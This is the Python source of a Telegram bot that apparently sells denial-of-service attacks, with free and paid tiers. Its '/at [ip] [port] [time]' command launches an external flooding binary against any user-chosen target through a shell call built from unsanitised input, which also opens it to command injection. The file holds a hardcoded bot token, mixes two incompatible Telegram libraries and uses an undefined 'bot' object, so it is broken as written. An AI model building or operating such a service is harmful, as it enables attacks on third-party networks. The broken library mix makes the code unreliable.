
import os
import time
import telegram
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext, ConversationHandler
import threading
import re
import json
import subprocess
from datetime import datetime, timedelta

# Bot token
BOT_TOKEN = "7585657026:AAEMT-G1MDQnsLBLoWP-79QNRo1bIOQReYs"  # Replace with your bot token
ADMIN_ID = 6696347739  # Replace with your Telegram user ID

# Initialize bot
updater = Updater(token=BOT_TOKEN, use_context=True)
dispatcher = updater.dispatcher

# Database file paths
USERS_FILE = "users.txt"
LOGS_FILE = "logs.txt"
ATTACK_HISTORY_FILE = "attack_history.json"
APPROVED_USERS_FILE = "approved_users.json"

# Ensure files exist
def ensure_files_exist():
    files = [USERS_FILE, LOGS_FILE, ATTACK_HISTORY_FILE, APPROVED_USERS_FILE]
    for file in files:
        if not os.path.exists(file):
            if file.endswith('.json'):
                with open(file, 'w') as f:
                    json.dump({}, f)
            else:
                open(file, 'a').close()

# User states
user_states = {}
user_captcha = {}
active_attacks = {}
feedback_pending = {}
cooldown_timers = {}

# Create or load approved users
def load_approved_users():
    ensure_files_exist()
    try:
        with open(APPROVED_USERS_FILE, 'r') as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return {"approved": {}, "paid": {}}

def save_approved_users(data):
    with open(APPROVED_USERS_FILE, 'w') as f:
        json.dump(data, f)

# Load attack history
def load_attack_history():
    ensure_files_exist()
    try:
        with open(ATTACK_HISTORY_FILE, 'r') as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return {}

def save_attack_history(data):
    with open(ATTACK_HISTORY_FILE, 'w') as f:
        json.dump(data, f)

# Save user to users.txt
def save_user(user_id, username):
    with open(USERS_FILE, 'a') as f:
        f.write(f"{user_id},{username}\n")

# Save log
def save_log(user_id, username, action):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOGS_FILE, 'a') as f:
        f.write(f"{timestamp} - User ID: {user_id} - Username: {username} - Action: {action}\n")

# Check if user is authorized
def is_authorized(user_id):
    approved_users = load_approved_users()
    
    # Check if user is in the approved list
    if str(user_id) in approved_users["approved"]:
        expiry = approved_users["approved"][str(user_id)]["expiry"]
        if expiry == "unlimited" or datetime.now() < datetime.fromisoformat(expiry):
            return True
    
    # Check if user is in the paid list
    if str(user_id) in approved_users["paid"]:
        expiry = approved_users["paid"][str(user_id)]["expiry"]
        if expiry == "unlimited" or datetime.now() < datetime.fromisoformat(expiry):
            return True
    
    # If user has pending feedback, they are not authorized
    if str(user_id) in feedback_pending and feedback_pending[str(user_id)]:
        return False
    
    return True

# Generate random CAPTCHA
def generate_captcha():
    import random
    num1 = random.randint(1, 10)
    num2 = random.randint(1, 10)
    operation = random.choice(['+', '-', '*'])
    
    if operation == '+':
        result = num1 + num2
    elif operation == '-':
        result = num1 - num2
    else:
        result = num1 * num2
    
    return f"{num1} {operation} {num2}", str(result)

# Start command
def start(update: Update, context: CallbackContext):
    message = update.message
    user_id = message.from_user.id
    username = message.from_user.username or f"user_{user_id}"
    
    # Reset user state
    user_states[user_id] = "captcha"
    
    # Show animation message
    animation_msg = message.reply_text("Initializing System...")
    
    # Simulate loading animation
    time.sleep(1)
    context.bot.edit_message_text("Initializing System...\n█████████ 100% [LOADED] ✅", user_id, animation_msg.message_id)
    
    time.sleep(0.5)
    context.bot.edit_message_text("Initializing System...\n█████████ 100% [LOADED] ✅\n🔓 Unlocking Secure Gateway...\n█▒▒▒▒▒▒▒▒▒▒▒▒ 10%", user_id, animation_msg.message_id)
    
    time.sleep(0.5)
    bot.edit_message_text("Initializing System...\n█████████ 100% [LOADED] ✅\n🔓 Unlocking Secure Gateway...\n███▒▒▒▒▒▒▒▒▒▒ 30%", user_id, animation_msg.message_id)
    
    time.sleep(0.5)
    bot.edit_message_text("Initializing System...\n█████████ 100% [LOADED] ✅\n🔓 Unlocking Secure Gateway...\n█████▒▒▒▒▒▒▒▒ 50%", user_id, animation_msg.message_id)
    
    time.sleep(0.5)
    bot.edit_message_text("Initializing System...\n█████████ 100% [LOADED] ✅\n🔓 Unlocking Secure Gateway...\n███████▒▒▒▒▒▒ 70%", user_id, animation_msg.message_id)
    
    time.sleep(0.5)
    bot.edit_message_text("Initializing System...\n█████████ 100% [LOADED] ✅\n🔓 Unlocking Secure Gateway...\n█████████▒▒▒▒ 90%", user_id, animation_msg.message_id)
    
    time.sleep(0.5)
    bot.edit_message_text("Initializing System...\n█████████ 100% [LOADED] ✅\n🔓 Unlocking Secure Gateway...\n███████████ 100% ✅\nACCESS GRANTED 🟢", user_id, animation_msg.message_id)
    
    time.sleep(1)
    bot.send_message(user_id, "🦾 Welcome, Cyber Warrior! Ready to Dominate the Dos service?\n🔰 But First, Verify Yourself…")
    
    # Send CAPTCHA
    captcha_question, captcha_answer = generate_captcha()
    user_captcha[user_id] = captcha_answer
    bot.send_message(user_id, f"🔐 Solve this CAPTCHA to proceed:\n\n{captcha_question} = ?")
    
    # Log action
    save_log(user_id, username, "Started bot")

# Handle CAPTCHA response
@bot.message_handler(func=lambda message: user_states.get(message.from_user.id) == "captcha")
def handle_captcha(message):
    user_id = message.from_user.id
    username = message.from_user.username or f"user_{user_id}"
    
    if message.text == user_captcha.get(user_id):
        user_states[user_id] = "name"
        bot.send_message(user_id, "✅ CAPTCHA correct!\n\nEnter your name to continue:")
    else:
        bot.send_message(user_id, "❌ CAPTCHA incorrect. Try again.")
        captcha_question, captcha_answer = generate_captcha()
        user_captcha[user_id] = captcha_answer
        bot.send_message(user_id, f"🔐 Solve this CAPTCHA to proceed:\n\n{captcha_question} = ?")

# Handle name input
@bot.message_handler(func=lambda message: user_states.get(message.from_user.id) == "name")
def handle_name(message):
    user_id = message.from_user.id
    username = message.from_user.username or f"user_{user_id}"
    name = message.text
    
    # Save user info
    save_user(user_id, name)
    
    # Update state
    user_states[user_id] = "terms"
    
    # Send terms agreement
    markup = types.InlineKeyboardMarkup(row_width=2)
    yes_btn = types.InlineKeyboardButton("✅ YES", callback_data="terms_yes")
    no_btn = types.InlineKeyboardButton("❌ NO", callback_data="terms_no")
    markup.add(yes_btn, no_btn)
    
    bot.send_message(user_id, "Will you send feedback (photo) after every match?", reply_markup=markup)
    
    # Send notification to admin
    bot.send_message(ADMIN_ID, f"🔔 New user registered:\nName: {name}\nUsername: {username}\nUser ID: {user_id}")

# Handle terms agreement
@bot.callback_query_handler(func=lambda call: call.data.startswith("terms_"))
def handle_terms(call):
    user_id = call.from_user.id
    username = call.from_user.username or f"user_{user_id}"
    
    if call.data == "terms_yes":
        # Initialize feedback system
        feedback_pending[str(user_id)] = False
        
        # Send help command
        bot.delete_message(chat_id=user_id, message_id=call.message.message_id)
        bot.send_message(user_id, "✅ Agreement accepted! Here are the available commands:")
        help_command(call.message)
    else:
        bot.delete_message(chat_id=user_id, message_id=call.message.message_id)
        bot.send_message(user_id, "⚠ ACCESS DENIED: Get Lost!")
        # Remove user state
        if user_id in user_states:
            del user_states[user_id]

# Help command
@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = message.from_user.id
    username = message.from_user.username or f"user_{user_id}"
    
    if not is_authorized(user_id):
        bot.send_message(user_id, "🚨 SYSTEM ALERT 🚨\n❌ ACTION BLOCKED!\n⚠ Send Feedback to Continue...\nOtherwise, Wait for Admin Approval.")
        return
    
    help_text = (
        "✅ Commands Available:\n"
        "1️⃣ /at [ip] [port] [time] → Free users' attack command.\n"
        "2️⃣ /report → Send error reports to admin.\n"
        "3️⃣ /buy → View paid plans & contact admin."
    )
    
    bot.send_message(user_id, help_text)
    save_log(user_id, username, "Accessed help menu")

# Attack command
def attack_command(update: Update, context: CallbackContext):
    message = update.message
    user_id = message.from_user.id
    username = message.from_user.username or f"user_{user_id}"
    
    # Check if user is authorized
    if not is_authorized(user_id):
        bot.send_message(user_id, "🚨 SYSTEM ALERT 🚨\n❌ ACTION BLOCKED!\n⚠ Send Feedback to Continue...\nOtherwise, Wait for Admin Approval.")
        return
    
    # Check if feedback is pending
    if str(user_id) in feedback_pending and feedback_pending[str(user_id)]:
        bot.send_message(user_id, "🚨 SYSTEM ALERT 🚨\n❌ ATTACK DENIED!\n⚠ Please send feedback from your previous attack first!")
        return
    
    # Check if user has an active attack
    if user_id in active_attacks:
        bot.send_message(user_id, "🚨 SYSTEM ALERT 🚨\n❌ ATTACK DENIED!\n⚠ You already have an attack running.\n⏳ Please wait for completion...")
        return
    
    # Parse command
    args = message.text.split()
    if len(args) != 4:
        bot.send_message(user_id, "❌ Invalid format. Use: /at [ip] [port] [time]")
        return
    
    ip = args[1]
    port = args[2]
    time_arg = args[3]
    
    # Validate time
    try:
        time_value = int(time_arg)
        if time_value <= 0:
            bot.send_message(user_id, "❌ Time must be a positive number.")
            return
    except ValueError:
        bot.send_message(user_id, "❌ Time must be a number.")
        return
    
    # Load attack history
    attack_history = load_attack_history()
    user_history = attack_history.get(str(user_id), {})
    
    # Check for cooldown on new IP
    current_time = datetime.now()
    
    if str(user_id) in cooldown_timers:
        cooldown_end = datetime.fromisoformat(cooldown_timers[str(user_id)])
        if current_time < cooldown_end:
            remaining = cooldown_end - current_time
            minutes, seconds = divmod(remaining.seconds, 60)
            bot.send_message(
                user_id,
                f"🚨 SYSTEM ALERT 🚨\n❌ ATTACK DENIED!\n⚠ You must wait **5 minutes** before using a new IP!\n⏳ Time Left: {minutes}:{seconds:02d}..."
            )
            return
    
    # Check if this is same IP+port or new IP
    target = f"{ip}:{port}"
    
    if target in user_history:
        # Same IP+port, limit to 60 seconds
        max_time = 60
    else:
        # New IP+port, limit to 230 seconds
        max_time = 230
        
        # If the user has previous attacks, set a cooldown for new IPs
        if user_history:
            cooldown_timers[str(user_id)] = (current_time + timedelta(minutes=5)).isoformat()
    
    # Apply time limit
    if time_value > max_time:
        time_value = max_time
    
    # Start attack
    attack_msg = bot.send_message(
        user_id,
        f"🚀 ATTACK LAUNCHED! 🚀\n🎯 **Target:** {ip}:{port}\n⏳ **Time Left:** {time_value} sec\n⚠ **Do NOT close the bot, attack in progress...**"
    )
    
    # Set active attack
    active_attacks[user_id] = {
        "ip": ip,
        "port": port,
        "time": time_value,
        "message_id": attack_msg.message_id,
        "start_time": current_time.isoformat()
    }
    
    # Update attack history
    if str(user_id) not in attack_history:
        attack_history[str(user_id)] = {}
    
    attack_history[str(user_id)][target] = {
        "last_attack": current_time.isoformat(),
        "count": attack_history.get(str(user_id), {}).get(target, {}).get("count", 0) + 1
    }
    
    save_attack_history(attack_history)
    
    # Save log
    save_log(user_id, username, f"Started attack on {ip}:{port} for {time_value} seconds")
    
    # Start countdown thread
    threading.Thread(target=attack_countdown, args=(user_id, time_value, attack_msg.message_id)).start()

def attack_countdown(user_id, duration, message_id):
    # Get attack details
    ip = active_attacks[user_id]["ip"]
    port = active_attacks[user_id]["port"]
    
    # Execute the actual attack command
    try:
        # Execute ./moul command with thread 70 as requested
        attack_process = subprocess.Popen(f"./moul {ip} {port} {duration} 70", shell=True)
    except Exception as e:
        print(f"Error executing attack command: {e}")
    
    # Update countdown
    for remaining in range(duration, 0, -1):
        if user_id not in active_attacks:
            break
            
        try:
            updater.bot.edit_message_text(
                f"🔥 ATTACK IN PROGRESS 🔥\n⏳ Time Left: {remaining} sec",
                user_id,
                message_id
            )
            time.sleep(1)
        except Exception as e:
            print(f"Error updating countdown: {e}")
    
    # Attack finished
    if user_id in active_attacks:
        try:
            updater.bot.edit_message_text(
                f"✅ ATTACK COMPLETED!\n🎯 Target: {ip}:{port}\n⏱ Duration: {duration} seconds",
                user_id,
                message_id
            )
            
            # For free users, set feedback pending
            approved_users = load_approved_users()
            if str(user_id) not in approved_users["paid"]:
                feedback_pending[str(user_id)] = True
                updater.bot.send_message(user_id, "⚠️ Please send a photo as feedback to continue using the bot!")
        except Exception as e:
            print(f"Error sending completion message: {e}")
        
        # Remove from active attacks
        del active_attacks[user_id]

# Handle feedback (photos)
@bot.message_handler(content_types=['photo'])
def handle_feedback(message):
    user_id = message.from_user.id
    username = message.from_user.username or f"user_{user_id}"
    
    if str(user_id) in feedback_pending and feedback_pending[str(user_id)]:
        # Clear feedback pending status
        feedback_pending[str(user_id)] = False
        
        # Thank user
        bot.send_message(user_id, "✅ Thank you for your feedback! You can continue using the bot.")
        
        # Forward feedback to admin
        bot.forward_message(ADMIN_ID, user_id, message.message_id)
        bot.send_message(ADMIN_ID, f"⚠️ Feedback received from:\nUsername: {username}\nUser ID: {user_id}")
        
        # Log
        save_log(user_id, username, "Sent feedback")
    else:
        bot.send_message(user_id, "✅ Thanks for the photo! But there's no pending feedback request.")

# Report command
@bot.message_handler(commands=['report'])
def report_command(message):
    user_id = message.from_user.id
    username = message.from_user.username or f"user_{user_id}"
    
    if not is_authorized(user_id):
        bot.send_message(user_id, "🚨 SYSTEM ALERT 🚨\n❌ ACTION BLOCKED!\n⚠ Send Feedback to Continue...\nOtherwise, Wait for Admin Approval.")
        return
    
    # Set user state to report
    user_states[user_id] = "report"
    
    bot.send_message(user_id, "📝 Please describe the issue you're experiencing:")
    save_log(user_id, username, "Started report process")

# Handle report messages
@bot.message_handler(func=lambda message: user_states.get(message.from_user.id) == "report")
def handle_report(message):
    user_id = message.from_user.id
    username = message.from_user.username or f"user_{user_id}"
    report_text = message.text
    
    # Forward report to admin
    bot.send_message(
        ADMIN_ID,
        f"📋 REPORT FROM USER:\nUsername: {username}\nUser ID: {user_id}\n\n{report_text}"
    )
    
    # Confirm to user
    bot.send_message(user_id, "✅ Your report has been sent to the admin. Thank you!")
    
    # Reset user state
    user_states[user_id] = None
    
    # Log action
    save_log(user_id, username, f"Sent report: {report_text[:50]}...")

# Buy command
@bot.message_handler(commands=['buy'])
def buy_command(message):
    user_id = message.from_user.id
    username = message.from_user.username or f"user_{user_id}"
    
    if not is_authorized(user_id):
        bot.send_message(user_id, "🚨 SYSTEM ALERT 🚨\n❌ ACTION BLOCKED!\n⚠ Send Feedback to Continue...\nOtherwise, Wait for Admin Approval.")
        return
    
    pricing_text = (
        "💰 PRICING PLANS 💰\n\n"
        "✅ Paid users do NOT need to send feedback.\n\n"
        "1 Day = ₹10\n"
        "7 Days = ₹50\n\n"
        "✅ Contact Admin: @Mukeshchh999"
    )
    
    bot.send_message(user_id, pricing_text)
    save_log(user_id, username, "Viewed pricing plans")

# Admin Commands
@bot.message_handler(commands=['approve'])
def approve_command(message):
    user_id = message.from_user.id
    
    # Verify admin
    if user_id != ADMIN_ID:
        bot.send_message(user_id, "❌ You are not authorized to use this command.")
        return
    
    # Parse command
    args = message.text.split()
    if len(args) != 3:
        bot.send_message(user_id, "❌ Invalid format. Use: /approve [userid] [days]")
        return
    
    target_user_id = args[1]
    days = args[2]
    
    # Load approved users
    approved_users = load_approved_users()
    
    # Set expiry date
    if days.lower() == "unlimited":
        expiry = "unlimited"
    else:
        try:
            days_value = int(days)
            expiry = (datetime.now() + timedelta(days=days_value)).isoformat()
        except ValueError:
            bot.send_message(user_id, "❌ Days must be a number or 'unlimited'.")
            return
    
    # Add user to approved list
    if "approved" not in approved_users:
        approved_users["approved"] = {}
    
    approved_users["approved"][target_user_id] = {
        "expiry": expiry,
        "approved_at": datetime.now().isoformat()
    }
    
    save_approved_users(approved_users)
    
    # Notify admin
    bot.send_message(user_id, f"✅ User {target_user_id} approved for {days} days.")
    
    # Notify user
    try:
        bot.send_message(
            int(target_user_id),
            f"🎉 GOOD NEWS! 🎉\n\nYour account has been approved by admin for {days} days!"
        )
    except Exception as e:
        bot.send_message(user_id, f"⚠️ Could not notify user: {e}")

@bot.message_handler(commands=['disapprove'])
def disapprove_command(message):
    user_id = message.from_user.id
    
    # Verify admin
    if user_id != ADMIN_ID:
        bot.send_message(user_id, "❌ You are not authorized to use this command.")
        return
    
    # Parse command
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(user_id, "❌ Invalid format. Use: /disapprove [userid]")
        return
    
    target_user_id = args[1]
    
    # Load approved users
    approved_users = load_approved_users()
    
    # Remove user from both lists
    removed = False
    
    if "approved" in approved_users and target_user_id in approved_users["approved"]:
        del approved_users["approved"][target_user_id]
        removed = True
    
    if "paid" in approved_users and target_user_id in approved_users["paid"]:
        del approved_users["paid"][target_user_id]
        removed = True
    
    if removed:
        save_approved_users(approved_users)
        bot.send_message(user_id, f"✅ User {target_user_id} has been disapproved.")
        
        # Notify user
        try:
            bot.send_message(
                int(target_user_id),
                "⚠️ NOTICE: Your access to the bot has been revoked by admin."
            )
        except Exception as e:
            bot.send_message(user_id, f"⚠️ Could not notify user: {e}")
    else:
        bot.send_message(user_id, f"⚠️ User {target_user_id} was not found in approved lists.")

@bot.message_handler(commands=['logs'])
def logs_command(message):
    user_id = message.from_user.id
    
    # Verify admin
    if user_id != ADMIN_ID:
        bot.send_message(user_id, "❌ You are not authorized to use this command.")
        return
    
    args = message.text.split()
    
    # If specific user logs are requested
    if len(args) == 2:
        target_user_id = args[1]
        
        # Read logs file and filter for this user
        try:
            with open(LOGS_FILE, 'r') as f:
                logs = f.readlines()
            
            user_logs = [log for log in logs if f"User ID: {target_user_id}" in log]
            
            if user_logs:
                response = f"📋 Logs for User ID {target_user_id}:\n\n"
                response += "".join(user_logs[-20:])  # Show last 20 logs
                bot.send_message(user_id, response)
            else:
                bot.send_message(user_id, f"⚠️ No logs found for User ID {target_user_id}")
        except Exception as e:
            bot.send_message(user_id, f"⚠️ Error reading logs: {e}")
    else:
        # Send entire logs file
        try:
            with open(LOGS_FILE, 'rb') as f:
                bot.send_document(user_id, f, caption="📋 Complete logs file")
        except Exception as e:
            bot.send_message(user_id, f"⚠️ Error sending logs: {e}")

@bot.message_handler(commands=['dellogs'])
def dellogs_command(message):
    user_id = message.from_user.id
    
    # Verify admin
    if user_id != ADMIN_ID:
        bot.send_message(user_id, "❌ You are not authorized to use this command.")
        return
    
    try:
        open(LOGS_FILE, 'w').close()  # Clear file
        bot.send_message(user_id, "✅ Logs file has been cleared.")
    except Exception as e:
        bot.send_message(user_id, f"⚠️ Error clearing logs: {e}")

@bot.message_handler(commands=['broadcast'])
def broadcast_command(message):
    user_id = message.from_user.id
    
    # Verify admin
    if user_id != ADMIN_ID:
        bot.send_message(user_id, "❌ You are not authorized to use this command.")
        return
    
    # Extract broadcast message
    try:
        broadcast_msg = message.text.split(' ', 1)[1]
    except IndexError:
        bot.send_message(user_id, "❌ Please provide a message to broadcast.")
        return
    
    # Read users file
    try:
        with open(USERS_FILE, 'r') as f:
            users = f.readlines()
        
        user_ids = [line.split(',')[0] for line in users if ',' in line]
        
        # Send confirmation
        bot.send_message(user_id, f"📣 Broadcasting message to {len(user_ids)} users...")
        
        # Send broadcast
        success = 0
        failed = 0
        
        for target_id in user_ids:
            try:
                bot.send_message(
                    int(target_id),
                    f"📢 BROADCAST MESSAGE FROM ADMIN:\n\n{broadcast_msg}"
                )
                success += 1
            except Exception:
                failed += 1
        
        # Report results
        bot.send_message(user_id, f"📊 Broadcast results:\n✅ Sent: {success}\n❌ Failed: {failed}")
    except Exception as e:
        bot.send_message(user_id, f"⚠️ Error broadcasting message: {e}")

@bot.message_handler(commands=['view'])
def view_command(message):
    user_id = message.from_user.id
    
    # Verify admin
    if user_id != ADMIN_ID:
        bot.send_message(user_id, "❌ You are not authorized to use this command.")
        return
    
    approved_users = load_approved_users()
    
    # Count users
    total_users = 0
    try:
        with open(USERS_FILE, 'r') as f:
            total_users = len(f.readlines())
    except Exception:
        pass
    
    approved_count = len(approved_users.get("approved", {}))
    paid_count = len(approved_users.get("paid", {}))
    free_count = total_users - approved_count - paid_count
    
    # Prepare response
    response = f"📊 USER STATISTICS:\n\n"
    response += f"Total Users: {total_users}\n"
    response += f"Approved Users: {approved_count}\n"
    response += f"Paid Users: {paid_count}\n"
    response += f"Free Users: {free_count}\n\n"
    
    # Approved users details
    if approved_count > 0:
        response += "🔹 APPROVED USERS:\n"
        for user_id, data in approved_users.get("approved", {}).items():
            expiry = data["expiry"]
            if expiry != "unlimited":
                expiry_date = datetime.fromisoformat(expiry)
                days_left = (expiry_date - datetime.now()).days
                response += f"ID: {user_id} - Days left: {days_left}\n"
            else:
                response += f"ID: {user_id} - Days left: Unlimited\n"
    
    # Paid users details
    if paid_count > 0:
        response += "\n🔹 PAID USERS:\n"
        for user_id, data in approved_users.get("paid", {}).items():
            expiry = data["expiry"]
            if expiry != "unlimited":
                expiry_date = datetime.fromisoformat(expiry)
                days_left = (expiry_date - datetime.now()).days
                response += f"ID: {user_id} - Days left: {days_left}\n"
            else:
                response += f"ID: {user_id} - Days left: Unlimited\n"
    
    bot.send_message(user_id, response)

@bot.message_handler(commands=['vip'])
def vip_command(message):
    user_id = message.from_user.id
    
    # Verify admin
    if user_id != ADMIN_ID:
        bot.send_message(user_id, "❌ You are not authorized to use this command.")
        return
    
    # Parse command
    args = message.text.split()
    if len(args) != 3:
        bot.send_message(user_id, "❌ Invalid format. Use: /vip [userid] [days]")
        return
    
    target_user_id = args[1]
    days = args[2]
    
    # Load approved users
    approved_users = load_approved_users()
    
    # Set expiry date
    if days.lower() == "unlimited":
        expiry = "unlimited"
    else:
        try:
            days_value = int(days)
            expiry = (datetime.now() + timedelta(days=days_value)).isoformat()
        except ValueError:
            bot.send_message(user_id, "❌ Days must be a number or 'unlimited'.")
            return
    
    # Add user to paid list
    if "paid" not in approved_users:
        approved_users["paid"] = {}
    
    approved_users["paid"][target_user_id] = {
        "expiry": expiry,
        "approved_at": datetime.now().isoformat()
    }
    
    save_approved_users(approved_users)
    
    # Notify admin
    bot.send_message(user_id, f"✅ User {target_user_id} added as VIP for {days} days.")
    
    # Notify user
    try:
        bot.send_message(
            int(target_user_id),
            f"🎉 CONGRATULATIONS! 🎉\n\nYou have been upgraded to VIP status for {days} days! You don't need to send feedback after attacks."
        )
    except Exception as e:
        bot.send_message(user_id, f"⚠️ Could not notify user: {e}")

# Handle any other text message
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    user_id = message.from_user.id
    
    if not is_authorized(user_id):
        bot.send_message(user_id, "🚨 SYSTEM ALERT 🚨\n❌ ACTION BLOCKED!\n⚠ Send Feedback to Continue...\nOtherwise, Wait for Admin Approval.")
        return
    
    bot.send_message(user_id, "❓ Unknown command. Use /help to see available commands.")

# Register all handlers with the dispatcher
def register_handlers():
    # Command handlers
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("help", help_command))
    dispatcher.add_handler(CommandHandler("at", attack_command))
    dispatcher.add_handler(CommandHandler("report", report_command))
    dispatcher.add_handler(CommandHandler("buy", buy_command))
    
    # Admin command handlers
    dispatcher.add_handler(CommandHandler("approve", approve_command))
    dispatcher.add_handler(CommandHandler("disapprove", disapprove_command))
    dispatcher.add_handler(CommandHandler("logs", logs_command))
    dispatcher.add_handler(CommandHandler("dellogs", dellogs_command))
    dispatcher.add_handler(CommandHandler("broadcast", broadcast_command))
    dispatcher.add_handler(CommandHandler("view", view_command))
    dispatcher.add_handler(CommandHandler("vip", vip_command))
    
    # Callback query handler for buttons
    dispatcher.add_handler(CallbackQueryHandler(handle_terms, pattern=r"^terms_"))
    
    # Message handlers
    dispatcher.add_handler(MessageHandler(Filters.photo, handle_feedback))
    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_all_messages))

# Ensure all files exist
ensure_files_exist()

if __name__ == "__main__":
    print("Bot started!")
    register_handlers()
    # Start the bot
    updater.start_polling()
    updater.idle()